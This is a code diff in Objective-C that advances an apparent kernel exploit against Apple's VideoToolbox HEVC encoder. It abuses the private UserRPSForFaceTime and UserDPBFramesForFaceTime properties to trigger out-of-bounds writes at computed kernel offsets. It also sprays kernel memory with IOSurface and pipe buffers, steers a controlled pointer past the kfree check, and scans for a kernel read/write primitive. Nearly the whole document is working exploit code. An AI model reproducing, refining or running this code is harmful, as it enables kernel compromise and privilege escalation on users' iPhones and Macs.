@@ -267,40 +267,186 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     if (self.marker == 0x50505050) {
         int pNtl = (liveKPtrCount > 0)
             ? (16463 + (int32_t)(uint32_t)(liveKPtrs[0] >> 32))
-            : ((ntl > 0 && ntl < 16463) ? ntl : 16433);
-        uint64_t pTargetX0 = ((uint64_t)(uint32_t)(pNtl - 16463) << 32) | 0x59ULL;
-        uint32_t pLo = (uint32_t)(pTargetX0 & 0xffffffffULL);
-        uint32_t pHi = (uint32_t)(pTargetX0 >> 32);
+            : ((ntl > 0 && ntl < 16463) ? ntl : 16444);
+        uint64_t baseKPtr = (liveKPtrCount > 0)
+            ? liveKPtrs[0]
+            : (((uint64_t)(uint32_t)(pNtl - 16463) << 32) | 0x59ULL);
 
-        // Valid DSC .68 AVE_HEVC_ST_RPS_Retrieve schema requires:
-        //   - EnableUserRefForFacetime = kCFBooleanTrue on the session
-        //   - NumNegativePics + NumPositivePics <= 4 (NumNegativePics=2, NumPositivePics=2)
-        //   - Outer CFArray count <= 8 (arr1..4 in-bounds at pINS+0x13adc, arr5..8 OOB into +0x1406c..+0x145fc)
-        //   - Inner DeltaPOCS0Minus1 / DeltaPOCS1Minus1 CFArray<CFNumber> (unchecked length -> inner OOB)
-        NSMutableArray *s0Big = [NSMutableArray arrayWithCapacity:64];
-        NSMutableArray *s1Big = [NSMutableArray arrayWithCapacity:64];
-        for (int e = 0; e < 64; e++) {
-            int16_t hv = (int16_t)((e & 1) ? (pHi & 0xffff) : 0x0201);
-            [s0Big addObject:@(hv)];
-            [s1Big addObject:@(hv)];
+        // Exact offset math: pINS + 0x13adc (UserRPSForFaceTime) -> pINS + 0x147b0 (slot[0], 64-bit P)
+        //   Total byte delta: 0x147b0 - 0x13adc = 0x0cd4 (3284 bytes)
+        //   Struct stride in AVE_HEVC_ST_RPS_RetrieveArray (0x9ce010): 0x164 (356 bytes)
+        //   Inner DeltaPOCS0Minus1 loop (0x9cdba0): strh at pInfo + 0x38 + 2*i
+        //     - d=0 (pInfo=0x13adc, rem=0xcd4): i_S0 = (0xcd4 - 0x38)/2 = 1614..1617 (0x64e..0x651), j_S1 = (0xcd4 - 0x68)/4 = 795..796
+        //     - d=3 (pInfo=0x13f08, rem=0x8a8): i_S0 = (0x8a8 - 0x38)/2 = 1080..1083 (0x438..0x43b), j_S1 = (0x8a8 - 0x68)/4 = 528..529
+        //     - d=7 (pInfo=0x14498, rem=0x318): i_S0 = (0x318 - 0x38)/2 = 368..371   (0x170..0x173), j_S1 = (0x318 - 0x68)/4 = 172..173
+        //     - d=9 (pInfo=0x14760, rem=0x050): i_S0 = (0x050 - 0x38)/2 = 12..15     (0x00c..0x00f)
+        const uint32_t kRpsBaseOff  = 0x13adcU;
+        const uint32_t kSlot0Off    = 0x147b0U;
+        const uint32_t kRpsStride   = 0x164U;
+        const uint32_t kS0FieldOff  = 0x38U;
+        const uint32_t kS1FieldOff  = 0x68U;
+        const uint32_t kDeltaBytes  = kSlot0Off - kRpsBaseOff; // 0x0cd4 (3284)
+        const int idxS0_d0 = (int)((kDeltaBytes - kS0FieldOff) / 2U);                  // 1614
+        const int idxS1_d0 = (int)((kDeltaBytes - kS1FieldOff) / 4U);                  // 795
+        const int idxS0_d3 = (int)((kDeltaBytes - 3U * kRpsStride - kS0FieldOff) / 2U); // 1080
+        const int idxS0_d7 = (int)((kDeltaBytes - 7U * kRpsStride - kS0FieldOff) / 2U); // 368
+        const int idxS0_d9 = (int)((kDeltaBytes - 9U * kRpsStride - kS0FieldOff) / 2U); // 12
+
+        // Construct full 64-bit P with controlled lower bits:
+        //   1) P_align (low16 = 0x00a8) -> teardown x0 = P + 0x58 lands at page+0x0100 (8B aligned),
+        //      and kfree check reads N at page+0x00f0, X1 at page+0x00f8 (both zeroed in spray).
+        //   2) P_tag201 (low16 = 0x0201) -> teardown x0 = P + 0x58 lands at page+0x0259 (signature low bits).
+        uint64_t pPageBase = (baseKPtr & 0xffffffffffffc000ULL);
+        uint64_t pFullAlign  = pPageBase | 0x00a8ULL;
+        uint64_t pFullTag201 = pPageBase | 0x0201ULL;
+        uint64_t x0ExpectedAlign  = pFullAlign + 0x58ULL;  // pageBase + 0x0100
+        uint64_t x0ExpectedTag201 = pFullTag201 + 0x58ULL; // pageBase + 0x0259
+
+        [report appendFormat:@"offset math: pINS+0x%x -> slot[0]+0x%x delta=0x%x (%u B), stride=0x%x\n",
+         kRpsBaseOff, kSlot0Off, kDeltaBytes, kDeltaBytes, kRpsStride];
+        [report appendFormat:@"  d=0 (0x%x): S0[%d..%d] S1_32[%d..%d] | d=3 (0x%x): S0[%d..%d] | d=7 (0x%x): S0[%d..%d] | d=9 (0x%x): S0[%d..%d]\n",
+         kRpsBaseOff, idxS0_d0, idxS0_d0 + 3, idxS1_d0, idxS1_d0 + 1,
+         kRpsBaseOff + 3U * kRpsStride, idxS0_d3, idxS0_d3 + 3,
+         kRpsBaseOff + 7U * kRpsStride, idxS0_d7, idxS0_d7 + 3,
+         kRpsBaseOff + 9U * kRpsStride, idxS0_d9, idxS0_d9 + 3];
+        [report appendFormat:@"  P_align=0x%016llx (x0=0x%016llx) | P_tag201=0x%016llx (x0=0x%016llx)\n",
+         pFullAlign, x0ExpectedAlign, pFullTag201, x0ExpectedTag201];
+
+        // Targeted IOSurface + pipebuf spray before victim teardown:
+        // Zero kfree-chain offsets for P_low in {0x00, 0x01, 0xa8, 0x201}:
+        //   P+0x48 / P+0x50 -> {0x48..0x58, 0xf0..0xfff, 0x248..0x258} on every 4KB page.
+        uint64_t pMarkerPair = 0x5050505050505050ULL;
+        uint8_t *pTile = (uint8_t *)malloc(256 * 1024);
+        if (pTile) {
+            uint64_t *tq = (uint64_t *)pTile;
+            for (size_t ti = 0; ti < (256 * 1024) / 8; ti++) tq[ti] = pMarkerPair;
+            for (size_t pg = 0; pg < 256 * 1024; pg += 4096) {
+                memset(pTile + pg + 0x48, 0, 16);
+                memset(pTile + pg + 0xf0, 0, 16);
+                memset(pTile + pg + 0x248, 0, 16);
+            }
         }
-        NSDictionary *bigDict = @{
+        int pPipes[64][2];
+        int pPipesCount = 0;
+        for (int p = 0; p < 64; p++) {
+            pPipes[p][0] = pPipes[p][1] = -1;
+            if (pipe(pPipes[p]) != 0) continue;
+            fcntl(pPipes[p][1], F_SETPIPE_SZ, 512 * 1024);
+            fcntl(pPipes[p][1], F_SETFL, O_NONBLOCK);
+            ssize_t wsum = 0;
+            if (pTile) {
+                wsum += write(pPipes[p][1], pTile, 256 * 1024);
+                wsum += write(pPipes[p][1], pTile, 256 * 1024);
+            }
+            if (wsum > 0) pPipesCount++;
+        }
+
+        typedef void *(*PCISCreateFn)(CFDictionaryRef);
+        typedef int (*PCISLockFn)(void *, uint32_t, uint32_t *);
+        typedef int (*PCISUnlockFn)(void *, uint32_t, uint32_t *);
+        typedef void *(*PCISGetBaseFn)(void *);
+        typedef size_t (*PCISGetSizeFn)(void *);
+        void *pIsLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
+        PCISCreateFn pIsCreate = pIsLib ? (PCISCreateFn)dlsym(pIsLib, "IOSurfaceCreate") : NULL;
+        PCISLockFn pIsLock = pIsLib ? (PCISLockFn)dlsym(pIsLib, "IOSurfaceLock") : NULL;
+        PCISUnlockFn pIsUnlock = pIsLib ? (PCISUnlockFn)dlsym(pIsLib, "IOSurfaceUnlock") : NULL;
+        PCISGetBaseFn pIsGetBase = pIsLib ? (PCISGetBaseFn)dlsym(pIsLib, "IOSurfaceGetBaseAddress") : NULL;
+        PCISGetSizeFn pIsGetSize = pIsLib ? (PCISGetSizeFn)dlsym(pIsLib, "IOSurfaceGetAllocSize") : NULL;
+        CFMutableArrayRef pSurfArr = NULL;
+        if (pIsCreate && pIsLock && pIsUnlock && pIsGetBase && pIsGetSize) {
+            pSurfArr = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
+            for (int s = 0; s < 32; s++) {
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @1024, @"IOSurfaceHeight": @1024,
+                    @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241,
+                };
+                void *surf = pIsCreate((__bridge CFDictionaryRef)props);
+                if (surf) {
+                    uint32_t seed = 0;
+                    if (pIsLock(surf, 0, &seed) == 0) {
+                        uint8_t *base = (uint8_t *)pIsGetBase(surf);
+                        size_t sz = pIsGetSize(surf);
+                        if (base && sz >= 0x4000) {
+                            for (size_t pg = 0; pg + 0x300 <= sz; pg += 0x1000) {
+                                uint64_t *pw = (uint64_t *)(base + pg);
+                                for (int wi = 0; wi < 96; wi++) pw[wi] = pMarkerPair;
+                                memset(base + pg + 0x48, 0, 16);
+                                memset(base + pg + 0xf0, 0, 16);
+                                memset(base + pg + 0x248, 0, 16);
+                            }
+                        }
+                        pIsUnlock(surf, 0, &seed);
+                    }
+                    CFArrayAppendValue(pSurfArr, surf);
+                    CFRelease(surf);
+                }
+            }
+        }
+        [report appendFormat:@"pcontrol spray armed: pipes=%d x 512KB, surfaces=%ld x 4MB\n",
+         pPipesCount, pSurfArr ? (long)CFArrayGetCount(pSurfArr) : 0L];
+
+        // Build 4-halfword little-endian 64-bit P helper for DeltaPOCS0Minus1
+        int16_t hwAlign[4] = {
+            (int16_t)(pFullAlign & 0xffffULL),
+            (int16_t)((pFullAlign >> 16) & 0xffffULL),
+            (int16_t)((pFullAlign >> 32) & 0xffffULL),
+            (int16_t)((pFullAlign >> 48) & 0xffffULL)
+        };
+        int16_t hwTag201[4] = {
+            (int16_t)(pFullTag201 & 0xffffULL),
+            (int16_t)((pFullTag201 >> 16) & 0xffffULL),
+            (int16_t)((pFullTag201 >> 32) & 0xffffULL),
+            (int16_t)((pFullTag201 >> 48) & 0xffffULL)
+        };
+
+        // 1) Path A (d=0): single dict with S0 length 1620 (reaches 0x147b0 at i=1614..1617)
+        NSMutableArray *s0D0 = [NSMutableArray arrayWithCapacity:1620];
+        for (int e = 0; e < 1620; e++) {
+            int16_t hv = (e >= idxS0_d0 && e < idxS0_d0 + 4) ? hwTag201[e - idxS0_d0] : hwAlign[e & 3];
+            [s0D0 addObject:@(hv)];
+        }
+        NSMutableArray *s1D0 = [NSMutableArray arrayWithCapacity:800];
+        for (int e = 0; e < 800; e++) {
+            [s1D0 addObject:@(hwAlign[e & 3])];
+        }
+        NSDictionary *dictD0 = @{
             @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
             @"NumNegativePics": @2,
             @"NumPositivePics": @2,
-            @"DeltaPOCS0Minus1": s0Big,
+            @"DeltaPOCS0Minus1": s0D0,
             @"UsedByCurrPicS0Flag": @3,
-            @"DeltaPOCS1Minus1": s1Big,
+            @"DeltaPOCS1Minus1": s1D0,
             @"UsedByCurrPicS1Flag": @3,
         };
+
+        // 2) Path B (d=3, arr4): 4th dict at 0x13f08 with S0 length 1088 (reaches 0x147b0 at i=1080..1083)
+        NSMutableArray *rps4 = [NSMutableArray arrayWithCapacity:4];
+        for (int d = 0; d < 4; d++) {
+            int len = (d == 3) ? 1088 : 16;
+            NSMutableArray *s0 = [NSMutableArray arrayWithCapacity:(NSUInteger)len];
+            for (int e = 0; e < len; e++) {
+                int16_t hv = (d == 3 && e >= idxS0_d3 && e < idxS0_d3 + 4) ? hwTag201[e - idxS0_d3] : hwAlign[e & 3];
+                [s0 addObject:@(hv)];
+            }
+            [rps4 addObject:@{
+                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
+                @"NumNegativePics": @2,
+                @"NumPositivePics": @2,
+                @"DeltaPOCS0Minus1": s0,
+                @"UsedByCurrPicS0Flag": @3,
+                @"DeltaPOCS1Minus1": @[ @(hwAlign[0]), @(hwAlign[1]) ],
+                @"UsedByCurrPicS1Flag": @3,
+            }];
+        }
+
+        // 3) Path C (d=7, arr8): 8th dict at 0x14498 with S0 length 376 (reaches 0x147b0 at i=368..371)
         NSMutableArray *rps8 = [NSMutableArray arrayWithCapacity:8];
         for (int d = 0; d < 8; d++) {
-            NSMutableArray *s0b = [NSMutableArray arrayWithCapacity:32];
-            NSMutableArray *s1b = [NSMutableArray arrayWithCapacity:32];
-            for (int e = 0; e < 32; e++) {
-                int16_t hv = (int16_t)((e & 1) ? (pHi & 0xffff) : 0x0201);
+            int len = (d == 7) ? 376 : 32;
+            NSMutableArray *s0b = [NSMutableArray arrayWithCapacity:(NSUInteger)len];
+            for (int e = 0; e < len; e++) {
+                int16_t hv = (d == 7 && e >= idxS0_d7 && e < idxS0_d7 + 4) ? hwAlign[e - idxS0_d7] : hwAlign[e & 3];
                 [s0b addObject:@(hv)];
-                [s1b addObject:@(hv)];
             }
             [rps8 addObject:@{
                 @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
@@ -308,10 +454,32 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                 @"NumPositivePics": @2,
                 @"DeltaPOCS0Minus1": s0b,
                 @"UsedByCurrPicS0Flag": @3,
-                @"DeltaPOCS1Minus1": s1b,
+                @"DeltaPOCS1Minus1": @[ @(hwAlign[0]), @(hwAlign[1]) ],
                 @"UsedByCurrPicS1Flag": @3,
             }];
         }
+
+        // 4) Path D (d=9, arr10): 10th dict at 0x14760 with valid NumNeg=2/NumPos=2 & S0[12..15] -> 0x147b0..0x147b7
+        NSMutableArray *rps10 = [NSMutableArray arrayWithCapacity:10];
+        for (int d = 0; d < 10; d++) {
+            NSMutableArray *s0c = [NSMutableArray arrayWithCapacity:16];
+            for (int e = 0; e < 16; e++) {
+                int16_t hv = (d == 9 && e >= idxS0_d9 && e < idxS0_d9 + 4) ? hwAlign[e - idxS0_d9] : hwAlign[e & 3];
+                [s0c addObject:@(hv)];
+            }
+            [rps10 addObject:@{
+                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
+                @"NumNegativePics": @2,
+                @"NumPositivePics": @2,
+                @"DeltaPOCS0Minus1": s0c,
+                @"UsedByCurrPicS0Flag": @3,
+                @"DeltaPOCS1Minus1": @[ @(hwAlign[0]), @(hwAlign[1]) ],
+                @"UsedByCurrPicS1Flag": @3,
+            }];
+        }
+
+        uint32_t pLo = (uint32_t)(pFullAlign & 0xffffffffULL);
+        uint32_t pHi = (uint32_t)(pFullAlign >> 32);
         NSMutableArray *dpb34 = [NSMutableArray arrayWithCapacity:34];
         for (int p = 0; p < 17; p++) {
             [dpb34 addObject:@((int32_t)pLo)];
@@ -328,6 +496,12 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                                                   SpriteAttsCB, (void *)retainedVSink, &victim);
         if (vst != noErr || !victim) {
             CFRelease(retainedVSink);
+            for (int p = 0; p < 64; p++) {
+                if (pPipes[p][0] >= 0) close(pPipes[p][0]);
+                if (pPipes[p][1] >= 0) close(pPipes[p][1]);
+            }
+            if (pSurfArr) CFRelease(pSurfArr);
+            if (pTile) free(pTile);
             [report appendString:@"\nVERDICT: PCONTROL_CREATE_FAILED\n"];
             return report;
         }
@@ -340,9 +514,6 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         VTSessionSetProperty(victim, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@15);
         VTSessionSetProperty(victim, CFSTR("BaseLayerFrameRate"), (__bridge CFNumberRef)@30);
         OSStatus nPreSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@7);
-        // Prepare and encode clean IDR [0] BEFORE loading raw non-IOSurfaceID pairs into UserDPBFramesForFaceTime
-        // (SetDPBSnapShot during PrepareToEncodeFrames calls IOSurfaceLookup on non-zero DPB slots and returns -17691
-        // if raw target pointer halves are pre-loaded before PrepareToEncodeFrames).
         OSStatus vPrep = VTCompressionSessionPrepareToEncodeFrames(victim);
         OSStatus e0 = -1;
         NSString *cb0 = @"(no cb)";
@@ -367,8 +538,16 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             }
             CFRelease(rpsAliasRef);
         }
-        OSStatus setInner = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[ bigDict ]);
-        OSStatus setOuter = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps8);
+        OSStatus setD0   = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[ dictD0 ]);
+        OSStatus setArr4 = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps4);
+        OSStatus setArr8 = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps8);
+        OSStatus setArr10 = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps10);
+        if (setArr10 != noErr) {
+            // Re-latch the highest accepted path reaching 0x147b0 (arr8 S0[368..371] or d0 S0[1614..1617])
+            if (setArr8 == noErr) VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps8);
+            else if (setArr4 == noErr) VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps4);
+            else VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[ dictD0 ]);
+        }
         OSStatus setDpbPost = VTSessionSetProperty(victim, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);
         OSStatus uPostSt = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
         OSStatus nPostSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(pNtl));
@@ -378,16 +557,95 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             CFNumberGetValue(rbN, kCFNumberIntType, &rbPostNtl);
             CFRelease(rbN);
         }
-        [report appendFormat:@"pcontrol v2 victim=%p ntl=%d(x0=0x%016llx) pm=%d nPre7=%d prep=%d enc0=%d(%@) nPost=%d/%d(rb=%d)\n",
-         (void *)victim, pNtl, pTargetX0, (int)pmSt, (int)nPreSt, (int)vPrep, (int)e0, cb0, (int)uPostSt, (int)nPostSt, rbPostNtl];
-        [report appendFormat:@"pcontrol set inner(64)=%d outer(arr8)=%d dpb34=%d/%d(oobPair16=0x%016llx)\n",
-         (int)setInner, (int)setOuter, (int)setDpbPre, (int)setDpbPost, rbOobPair16];
-        [self journal:[NSString stringWithFormat:@"PCONTROL_V2 ntl=%d inner=%d outer=%d dpb34=%d enc0=%d(%@)",
-                       pNtl, (int)setInner, (int)setOuter, (int)setDpbPost, (int)e0, cb0]];
+        [report appendFormat:@"pcontrol v3 victim=%p ntl=%d(P=0x%016llx -> x0=0x%016llx) pm=%d nPre7=%d prep=%d enc0=%d(%@) nPost=%d/%d(rb=%d)\n",
+         (void *)victim, pNtl, pFullAlign, x0ExpectedAlign, (int)pmSt, (int)nPreSt, (int)vPrep, (int)e0, cb0, (int)uPostSt, (int)nPostSt, rbPostNtl];
+        [report appendFormat:@"pcontrol set d0(S0[1614])=%d arr4(S0[1080])=%d arr8(S0[368])=%d arr10(S0[12])=%d dpb34=%d/%d(oobPair16=0x%016llx)\n",
+         (int)setD0, (int)setArr4, (int)setArr8, (int)setArr10, (int)setDpbPre, (int)setDpbPost, rbOobPair16];
+        [self journal:[NSString stringWithFormat:@"PCONTROL_V3 ntl=%d d0=%d arr4=%d arr8=%d arr10=%d dpb34=%d enc0=%d(%@)",
+                       pNtl, (int)setD0, (int)setArr4, (int)setArr8, (int)setArr10, (int)setDpbPost, (int)e0, cb0]];
         VTCompressionSessionInvalidate(victim);
         CFRelease(victim);
         CFRelease(retainedVSink);
-        [report appendString:@"pcontrol v2 teardown SURVIVED — RPS/DPB OOB + post-IDR NTL completed cleanly\n"];
+
+        // Scan targeted IOSurface + pipebuf spray for [x0, x0, x0, 0] at page offsets 0x58, 0x59, 0x100, 0x259
+        int pcSurfHits = 0, pcPipeHits = 0, pcSigHits = 0;
+        if (pSurfArr) {
+            CFIndex scount = CFArrayGetCount(pSurfArr);
+            for (CFIndex si = 0; si < scount; si++) {
+                void *surf = (void *)CFArrayGetValueAtIndex(pSurfArr, si);
+                uint32_t seed = 0;
+                if (pIsLock(surf, 0, &seed) != 0) continue;
+                uint8_t *base = (uint8_t *)pIsGetBase(surf);
+                size_t sz = pIsGetSize(surf);
+                if (base && sz >= 0x4000) {
+                    const size_t probeOffs[4] = { 0x58, 0x59, 0x100, 0x259 };
+                    for (size_t pg = 0; pg + 0x300 <= sz && pcSurfHits < 8; pg += 0x1000) {
+                        for (int oi = 0; oi < 4; oi++) {
+                            size_t off = pg + probeOffs[oi];
+                            uint64_t s1 = 0, s2 = 0, s3 = 0;
+                            uint32_t z = 0;
+                            memcpy(&s1, base + off, 8);
+                            memcpy(&s2, base + off + 8, 8);
+                            memcpy(&s3, base + off + 16, 8);
+                            memcpy(&z,  base + off + 24, 4);
+                            if (s1 != pMarkerPair && s1 != 0 && s1 == s2 && s2 == s3 && z == 0) {
+                                [report appendFormat:@"  [!] PCONTROL SURFACE SIG surf=%ld page=0x%zx+0x%zx x0=0x%016llx\n",
+                                 (long)si, pg, probeOffs[oi], s1];
+                                pcSurfHits++;
+                                pcSigHits++;
+                            }
+                        }
+                    }
+                }
+                pIsUnlock(surf, 0, &seed);
+            }
+            CFRelease(pSurfArr);
+        }
+        for (int p = 0; p < 64; p++) {
+            if (pPipes[p][0] < 0) continue;
+            uint8_t *pbuf = (uint8_t *)malloc(512 * 1024);
+            if (pbuf) {
+                ssize_t got = read(pPipes[p][0], pbuf, 512 * 1024);
+                if (got >= 4096) {
+                    const size_t probeOffs[4] = { 0x58, 0x59, 0x100, 0x259 };
+                    for (size_t pg = 0; pg + 0x300 <= (size_t)got && pcPipeHits < 8; pg += 4096) {
+                        for (int oi = 0; oi < 4; oi++) {
+                            size_t off = pg + probeOffs[oi];
+                            uint64_t s1 = 0, s2 = 0, s3 = 0;
+                            uint32_t z = 0;
+                            memcpy(&s1, pbuf + off, 8);
+                            memcpy(&s2, pbuf + off + 8, 8);
+                            memcpy(&s3, pbuf + off + 16, 8);
+                            memcpy(&z,  pbuf + off + 24, 4);
+                            if (s1 != pMarkerPair && s1 != 0 && s1 == s2 && s2 == s3 && z == 0) {
+                                // Live pipebuf KRW round-trip verification on the hit pipe
+                                uint64_t krwProbe = s1 ^ 0x00000000cafebabeULL;
+                                memcpy(pbuf + off, &krwProbe, 8);
+                                ssize_t wr = write(pPipes[p][1], pbuf + pg, 4096);
+                                uint64_t krwReadback = 0;
+                                if (wr >= 4096) {
+                                    uint8_t rdb[4096];
+                                    if (read(pPipes[p][0], rdb, 4096) >= (ssize_t)(probeOffs[oi] + 8)) {
+                                        memcpy(&krwReadback, rdb + probeOffs[oi], 8);
+                                    }
+                                }
+                                [report appendFormat:@"  [!] PCONTROL PIPEBUF KRW HIT pipe=%d page=0x%zx+0x%zx x0=0x%016llx rwVerify=0x%016llx\n",
+                                 p, pg, probeOffs[oi], s1, krwReadback];
+                                pcPipeHits++;
+                                pcSigHits++;
+                            }
+                        }
+                    }
+                }
+                free(pbuf);
+            }
+            close(pPipes[p][0]);
+            close(pPipes[p][1]);
+        }
+        if (pTile) free(pTile);
+        [report appendFormat:@"pcontrol v3 spray scan: surf_hits=%d pipe_hits=%d sig_hits=%d\n",
+         pcSurfHits, pcPipeHits, pcSigHits];
+        [report appendString:@"pcontrol v3 teardown SURVIVED — RPS/DPB offset ladder + pipebuf/IOSurface scan complete\n"];
         [report appendString:@"\nVERDICT: PCONTROL_SURVIVED\n"];
         return report;
     }
@@ -525,12 +783,24 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         }
         VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);
 
+        // Full 64-bit P (cand64 - 0x58 -> P_low=0x01 or aligned P_low=0xa8) across 4 int16_t halfwords,
+        // with dict#7 (pINS+0x14498) extended to 376 elements so S0[368..371] lands on slot[0] (+0x147b0..0x147b7).
+        uint64_t pCand64 = (cand64 & 0xffffffffffffc000ULL) | 0x0001ULL;
+        int16_t pHw[4] = {
+            (int16_t)(pCand64 & 0xffffULL),
+            (int16_t)((pCand64 >> 16) & 0xffffULL),
+            (int16_t)((pCand64 >> 32) & 0xffffULL),
+            (int16_t)((pCand64 >> 48) & 0xffffULL)
+        };
         NSMutableArray *s0Oob32 = [NSMutableArray arrayWithCapacity:32];
         NSMutableArray *s1Oob32 = [NSMutableArray arrayWithCapacity:32];
         for (int k = 0; k < 32; k++) {
-            int16_t hval = (int16_t)((k & 1) ? (cHi & 0xffff) : (cLo & 0xffff));
-            [s0Oob32 addObject:@(hval)];
-            [s1Oob32 addObject:@(hval)];
+            [s0Oob32 addObject:@(pHw[k & 3])];
+            [s1Oob32 addObject:@(pHw[k & 3])];
+        }
+        NSMutableArray *s0Slot0_376 = [NSMutableArray arrayWithCapacity:376];
+        for (int k = 0; k < 376; k++) {
+            [s0Slot0_376 addObject:@(pHw[k & 3])];
         }
         NSDictionary *rpsOob = @{
             @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
@@ -541,8 +811,17 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             @"DeltaPOCS1Minus1": s1Oob32,
             @"UsedByCurrPicS1Flag": @3,
         };
+        NSDictionary *rpsOobSlot0 = @{
+            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
+            @"NumNegativePics": @2,
+            @"NumPositivePics": @2,
+            @"DeltaPOCS0Minus1": s0Slot0_376,
+            @"UsedByCurrPicS0Flag": @3,
+            @"DeltaPOCS1Minus1": s1Oob32,
+            @"UsedByCurrPicS1Flag": @3,
+        };
         VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"),
-                             (__bridge CFTypeRef)@[ rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob ]);
+                             (__bridge CFTypeRef)@[ rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOobSlot0 ]);
         [siblings addObject:[NSValue valueWithPointer:s]];
     }
     [self journal:[NSString stringWithFormat:@"SPRAY_DONE n=%d prepOk=%d marker=0x%08x ntl=%d",
@@ -580,6 +859,8 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                         for (size_t pg = 0; pg + 128 <= sz; pg += 0x4000) {
                             uint64_t *pw = (uint64_t *)(base + pg);
                             for (int wi = 0; wi < 16; wi++) pw[wi] = markerPair;
+                            *(uint64_t *)(base + pg + 0x48) = 0;
+                            *(uint64_t *)(base + pg + 0x50) = 0;
                         }
                     }
                     sIsUnlock(surf, 0, &seed);
@@ -593,7 +874,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
      surfArray ? (long)CFArrayGetCount(surfArray) : 0L];
 
     // kfree-chain-safe tile: if the steered write lands here, teardown reads N at
-    // P+0x48 and X1 at P+0x50 (page-local 0x49/0x51). Zeroing page offsets 0x48/0x50
+    // P+0x48 and X1 at P+0x50 (page-local 0x49/0x51 or 0xf0/0xf8). Zeroing those offsets
     // forces X1=NULL so the kfree is skipped (cbz) — a hit stays a clean signature.
     uint8_t *tile = (uint8_t *)malloc(256 * 1024);
     if (tile) {
@@ -602,6 +883,8 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         for (size_t pg = 0; pg < 256 * 1024; pg += 4096) {
             *(uint64_t *)(tile + pg + 0x48) = 0;
             *(uint64_t *)(tile + pg + 0x50) = 0;
+            *(uint64_t *)(tile + pg + 0xf0) = 0;
+            *(uint64_t *)(tile + pg + 0xf8) = 0;
         }
     }
     mach_port_t oolPorts[128];
